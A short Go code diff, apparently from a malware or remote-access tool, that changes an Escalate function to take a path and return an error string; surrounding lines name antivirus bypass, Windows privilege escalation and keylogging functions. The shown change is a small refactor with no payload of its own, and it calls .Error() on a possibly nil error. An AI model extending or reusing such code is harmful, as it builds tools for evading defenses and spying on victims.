@@ -183,10 +183,13 @@ func Bypass() {
 	BypassAV()
 }
 
-func Escalate() {
+func Escalate(path string) string {
+	var _err error
 	if runtime.GOOS == "windows" {
-		goLift.WEscalate()
+		err := goLift.WEscalate(path)
+		_err = err
 	}
+	return _err.Error()
 }
 
 func LogKeys(logLocal *string) {
